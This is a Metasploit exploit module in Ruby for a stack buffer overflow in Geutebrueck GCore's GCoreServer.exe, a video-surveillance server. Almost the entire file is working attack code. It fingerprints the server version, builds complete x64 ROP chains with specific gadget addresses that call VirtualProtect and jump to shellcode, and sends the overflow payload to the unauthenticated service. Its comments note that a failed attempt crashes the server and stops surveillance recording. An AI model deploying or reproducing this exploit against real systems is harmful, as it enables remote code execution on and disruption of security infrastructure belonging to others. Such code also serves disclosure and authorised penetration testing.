# Date: 20170125
# Exploit Author: Luca Cappiello, Maurice Popp
# Contact(Twitter): @dopa_mined, @_m4p0
# Github: https://github.com/m4p0/Geutebrueck_GCore_X64_RCE_BO
# Vendor Homepage: http://www.geutebrueck.com/en_US/product-overview-31934.html
# Software Link: None
# Version: 1.3.8.42/1.4.2.37
# Tested on: Win7, Win8/8.1, Win2012R2
# CVE : None
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;nokogiri&#039;
require &#039;open-uri&#039;
 
class MetasploitModule < Msf::Exploit::Remote
    include Msf::Exploit::Remote::Tcp
 
    Rank = NormalRanking
 
    def initialize(info = {})
        super(update_info(info,
                          &#039;Name&#039;           => &#039;Geutebrueck GCore - GCoreServer.exe Buffer Overflow RCE&#039;,
                          &#039;Description&#039; => &#039;This module exploits a stack Buffer Overflow in the GCore server (GCoreServer.exe). The vulnerable webserver is running on Port 13003 and Port 13004, does not require authentication and affects all versions from 2003 till July 2016 (Version 1.4.YYYYY).&#039;,
                          &#039;License&#039;     => MSF_LICENSE,
                          &#039;Author&#039;       =>
                          [
                              &#039;Luca Cappiello&#039;,
                              &#039;Maurice Popp&#039;
 
                          ],
                          &#039;References&#039;   =>
                          [
                              [&#039;www.geutebrueck.com&#039;, &#039;&#039;]
                          ],
                          &#039;Platform&#039;       => &#039;win&#039;,
                          &#039;Targets&#039;     =>
                          [
                              [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true, &#039;Arch&#039; => ARCH_X86_64 }],
                              [&#039;GCore 1.3.8.42, Windows x64 (Win7, Win8/8.1, Win2012R2,...)&#039;, { &#039;Arch&#039; => ARCH_X86_64 }],
                              [&#039;GCore 1.4.2.37, Windows x64 (Win7, Win8/8.1, Win2012R2,...)&#039;, { &#039;Arch&#039; => ARCH_X86_64 }]
                          ],
                          &#039;Payload&#039;     =>
                          {
                              &#039;Space&#039; => &#039;2000&#039;
                          },
                          &#039;Privileged&#039;   => false,
                          &#039;DisclosureDate&#039; => &#039;Sep 01 2016&#039;,
                          &#039;DefaultTarget&#039;  => 0))
    end
 
    def fingerprint
        print_status(&#039;Trying to fingerprint server with http://&#039; + datastore[&#039;RHOST&#039;] + &#039;:&#039; + datastore[&#039;RPORT&#039;].to_s + &#039;/statistics/runningmoduleslist.xml...&#039;)
        @doc = Nokogiri::XML(open(&#039;http://&#039; + datastore[&#039;RHOST&#039;] + &#039;:&#039; + datastore[&#039;RPORT&#039;].to_s + &#039;/statistics/runningmoduleslist.xml&#039;))
        statistics = @doc.css(&#039;modulestate&#039;)
        statistics.each do |x|
            if (x.to_s.include? &#039;GCoreServer&#039;) && (x.to_s.include? &#039;1.3.8.42&#039;)
                mytarget = targets[1]
                # print_status(mytarget.name)
                print_status("Vulnerable version detected: #{mytarget.name}")
                return Exploit::CheckCode::Appears, mytarget
            elsif (x.to_s.include? &#039;GCoreServer&#039;) && (x.to_s.include? &#039;1.4.2.37&#039;)
                mytarget = targets[2]
                # print_status(mytarget.name)
                print_status("Vulnerable version detected: #{mytarget.name}")
                return Exploit::CheckCode::Appears, mytarget
                end
        end
        print_status(&#039;Statistics Page under http://&#039; + datastore[&#039;RHOST&#039;] + &#039;:&#039; + datastore[&#039;RPORT&#039;].to_s + &#039;/statistics/runningmoduleslist.xml is not available.&#039;)
        print_status("Make sure that you know the exact version, otherwise you&#039;ll knock out the service.")
        print_status(&#039;In the default configuration the service will restart after 1 minute and after the third crash the server will reboot!&#039;)
        print_status(&#039;After a crash, the videosurveillance system can not recover properly and stops recording.&#039;)
        [Exploit::CheckCode::Unknown, nil]
    end
 
    def check
        fingerprint
    end
 
    def ropchain(target)
        if target.name.include? &#039;1.3.8.42&#039;
            print_status(&#039;Preparing ROP chain for target 1.3.8.42!&#039;)
 
            # 0x140cd00a9 | add rsp, 0x10 ; ret
            # This is needed because the next 16 bytes are sometimes messed up.
            overwrite = [0x140cd00a9].pack(&#039;Q<&#039;)
 
            # These bytes "\x43" are sacrificed ; we align the stack to jump over this messed up crap.
            stack_align = "\x43" * 16
 
            # We have 40 bytes left to align our stack!
            # The most reliable way to align our stack is to save the value of rsp in another register, do some calculations
            # and to restore it.
            # We save RSP to RDX. Even if we use ESP/EDX registers in the instruction, it still works because the values are small enough.
 
            # 0x1404e5cbf: mov edx, esp ; ret
            stack_align += [0x1404e5cbf].pack(&#039;Q<&#039;)
 
            # As no useful "sub rdx, xxx" or "sub rsp, xxx" gadget were found, we use the add instruction with a negative value.
            # We pop -XXXXX as \xxxxxxxxx to rax
            # 0x14013db94  pop rax ; ret
            stack_align += [0x14013db94].pack(&#039;Q<&#039;)
            stack_align += [0xFFFFFFFFFFFFF061].pack(&#039;Q<&#039;)
 
            # Our value is enough.
            # 0x1407dc547  | add rax,rdx ; ret
            stack_align += [0x1407dc547].pack(&#039;Q<&#039;)
 
            # RSP gets restored with the new value. The return instruction doesn&#039;t break our ropchain and continues -XXXXX back.
            # 0x140ce9ac0 | mov rsp, rax ; ..... ; ret
            stack_align += [0x140ce9ac0].pack(&#039;Q<&#039;)
 
            # Virtualprotect Call for 64 Bit calling convention. Needs RCX, RDX, R8 and R9.
            # We want RCX to hold the value for VP Argument "Address of Shellcode"
            # 0x140cc2234 |  mov rcx, rax ; mov rax, qword [rcx+0x00000108] ; add rsp, 0x28 ; ret  ;
            rop = &#039;&#039;
            rop += [0x140cc2234].pack(&#039;Q<&#039;)
            rop += [0x4141414141414141].pack(&#039;Q<&#039;) * 5 # needed because of the stack aliging with "add rsp, 0x28" ;
            # 0x1400ae2ae    | POP RDX; RETN
            # 0x...1000        | Value for VP "Size of Memory"
            rop += [0x1400ae2ae].pack(&#039;Q<&#039;)
            rop += [0x0000000000000400].pack(&#039;Q<&#039;)
 
            # 0x14029dc6e:   | POP R8; RET
            # 0x...40                | Value for VP "Execute Permissions"
            rop += [0x14029dc6e].pack(&#039;Q<&#039;)
            rop += [0x0000000000000040].pack(&#039;Q<&#039;)
 
            # 0x1400aa030    | POP R9; RET
            # 0x...            | Value for VP "Writeable location". Not sure if needed?
            # 0x1409AE1A8 is the .data section of gcore; let&#039;s test with this writable section...
            rop += [0x1400aa030].pack(&#039;Q<&#039;)
            rop += [0x1409AE1A8].pack(&#039;Q<&#039;)
 
            # 0x140b5927a: xor rax, rax ; et
            rop += [0x140b5927a].pack(&#039;Q<&#039;)
 
            # 0x1402ce220 pop rax ; ret
            # 0x140d752b8 | VP Stub IAT Entry
            rop += [0x1402ce220].pack(&#039;Q<&#039;)
            rop += [0x140d752b8].pack(&#039;Q<&#039;)
 
            # 0x1407c6b3b mov rax, qword [rax] ; ret  ;
            rop += [0x1407c6b3b].pack(&#039;Q<&#039;)
 
            # 0x140989c41 push rax; ret
            rop += [0x140989c41].pack(&#039;Q<&#039;)
 
            # 0x1406d684d jmp rsp
            rop += [0x1406d684d].pack(&#039;Q<&#039;)
 
            [rop, overwrite, stack_align]
 
        elsif target.name.include? &#039;1.4.2.37&#039;
            print_status(&#039;Preparing ROP chain for target 1.4.2.37!&#039;)
 
            # 0x140cd9759 | add rsp, 0x10 ; ret
            # This is needed because the next 16 bytes are sometimes messed up.
            overwrite = [0x140cd9759].pack(&#039;Q<&#039;)
 
            # These bytes "\x43" are sacrificed ; we align the stack to jump over this messed up crap.
            stack_align = "\x43" * 16
 
            # We have 40 bytes left to align our stack!
            # The most reliable way to align our stack is to save the value of rsp in another register, do some calculations
            # and to restore it.
            # We save RSP to RDX. Even if we use ESP/EDX registers in the instruction, it still works because the values are small enough.
 
            # 0x1404f213f: mov edx, esp ; ret
            stack_align += [0x1404f213f].pack(&#039;Q<&#039;)
 
            # As no useful "sub rdx, xxx" or "sub rsp, xxx" gadget were found, we use the add instruction with a negative value.
            # We pop -XXXXX as \xxxxxxxxx to rax
            # 0x14000efa8  pop rax ; ret
            stack_align += [0x14000efa8].pack(&#039;Q<&#039;)
            stack_align += [0xFFFFFFFFFFFFF061].pack(&#039;Q<&#039;)
 
            # Our value is enough.
            # 0x140cdfe65  | add rax,rdx ; ret
            stack_align += [0x140cdfe65].pack(&#039;Q<&#039;)
 
            # RSP gets restored with the new value. The return instruction doesn&#039;t break our ropchain and continues -XXXXX back.
            # 0x140cf3110 | mov rsp, rax ; ..... ; ret
            stack_align += [0x140cf3110].pack(&#039;Q<&#039;)
 
            # Virtualprotect Call for 64 Bit calling convention. Needs RCX, RDX, R8 and R9.
            # We want RCX to hold the value for VP Argument "Address of Shellcode"
            # 0x140ccb984 |  mov rcx, rax ; mov rax, qword [rcx+0x00000108] ; add rsp, 0x28 ; ret  ;
            rop = &#039;&#039;
            rop += [0x140ccb984].pack(&#039;Q<&#039;)
            rop += [0x4141414141414141].pack(&#039;Q<&#039;) * 5 # needed because of the stack aliging with "add rsp, 0x28" ;
            # 0x14008f7ec    | POP RDX; RETN
            # 0x...1000        | Value for VP "Size of Memory"
            rop += [0x14008f7ec].pack(&#039;Q<&#039;)
            rop += [0x0000000000000400].pack(&#039;Q<&#039;)
 
            # 0x140a88f81:   | POP R8; RET
            # 0x...40                | Value for VP "Execute Permissions"
            rop += [0x140a88f81].pack(&#039;Q<&#039;)
            rop += [0x0000000000000040].pack(&#039;Q<&#039;)
 
            # 0x1400aa030    | POP R9; RET
            # 0x...            | Value for VP "Writeable location". Not sure if needed?
            # 0x140FB5000 is the .data section of gcore; let&#039;s test with this writable section...
            rop += [0x1400aa030].pack(&#039;Q<&#039;)
            rop += [0x140FB5000].pack(&#039;Q<&#039;)
 
            # 0x140ccea2f: xor rax, rax ; et
            rop += [0x140ccea2f].pack(&#039;Q<&#039;)
 
            # 0x14000efa8 pop rax ; ret
            # 0x140d83268 | VP Stub IAT Entry #TODO!
            rop += [0x14000efa8].pack(&#039;Q<&#039;)
            rop += [0x140d83268].pack(&#039;Q<&#039;)
 
            # 0x14095b254 mov rax, qword [rax] ; ret  ;
            rop += [0x14095b254].pack(&#039;Q<&#039;)
 
            # 0x140166c46 push rax; ret
            rop += [0x140166c46].pack(&#039;Q<&#039;)
 
            # 0x140cfb98d jmp rsp
            rop += [0x140cfb98d].pack(&#039;Q<&#039;)
 
            [rop, overwrite, stack_align]
 
        else
            print_status(&#039;ROP chain for this version not (yet) available or the target is not vulnerable.&#039;)
 
        end
      end
 
    def exploit
        # mytarget = target
        if target[&#039;auto&#039;]
            checkcode, target = fingerprint
            if checkcode.to_s.include? &#039;unknown&#039;
                print_status(&#039;No vulnerable Version detected - exploit aborted.&#039;)
            else
                target_rop, target_overwrite, target_stack_align = ropchain(target)
                begin
                    connect
                    print_status(&#039;Crafting Exploit...&#039;)
 
                    http_wannabe = &#039;GET /&#039;
                    buffer_200 = "\x41" * 200
                    rop = target_rop
                    payload.encoded
                    buffer_1823 = "\x41" * 1823
                    overwrite = target_overwrite
                    stack_align = target_stack_align
 
                    exploit = http_wannabe + buffer_200 + rop + payload.encoded + buffer_1823 + overwrite + stack_align
                    print_status(&#039;Exploit ready for sending...&#039;)
                    sock.put(exploit, &#039;Timeout&#039; => 20)
                    print_status(&#039;Exploit sent!&#039;)
                    # sleep(10)
                    buf = sock.get_once || &#039;&#039;
                rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
                    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
                ensure
                    print_status(&#039;Closing socket.&#039;)
                    disconnect
                    # sleep(10)
                end
            end
 
        else
            print_status(&#039;No auto detection - be sure to choose the right version! Otherwise the service will crash, the system reboots and leaves the surveillance software in an undefined status.&#039;)
            print_status("Selected version: #{self.target.name}")
            target_rop, target_overwrite, target_stack_align = ropchain(self.target)
            begin
                connect
                print_status(&#039;Crafting Exploit...&#039;)
 
                http_wannabe = &#039;GET /&#039;
                buffer_200 = "\x41" * 200
                rop = target_rop
                payload.encoded
                buffer_1823 = "\x41" * 1823
                overwrite = target_overwrite
                stack_align = target_stack_align
 
                exploit = http_wannabe + buffer_200 + rop + payload.encoded + buffer_1823 + overwrite + stack_align
                print_status(&#039;Exploit ready for sending...&#039;)
                sock.put(exploit, &#039;Timeout&#039; => 20)
                print_status(&#039;Exploit sent!&#039;)
                # sleep(10)
                buf = sock.get_once || &#039;&#039;
            rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
                elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
            ensure
                print_status(&#039;Closing socket.&#039;)
                disconnect
                # sleep(10)
            end
 
      end
    end
end

